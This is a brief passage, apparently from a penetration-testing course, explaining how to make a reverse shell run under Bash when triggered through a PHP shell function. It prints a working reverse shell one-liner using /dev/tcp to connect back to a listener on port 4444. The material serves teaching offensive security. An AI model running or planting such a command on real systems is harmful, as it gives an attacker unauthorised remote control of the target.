Listing 143 - Bash shell one-liner

Since we execute our command through the PHP shell function, we should be aware that the command may be executed via the Bourne Shell⁴⁰⁵ also known as sh, rather than Bash. The reverse shell one-liner in Listing 143 contains syntax that is not supported by the Bourne Shell. To ensure the reverse shell is executed by Bash, we need to modify the reverse shell command. We can do this by using the reverse shell one-liner as bash -c, which executes a command with Bash.

```
bash -c "bash -i >& /dev/tcp/192.168.119/4444 0>&1"
```
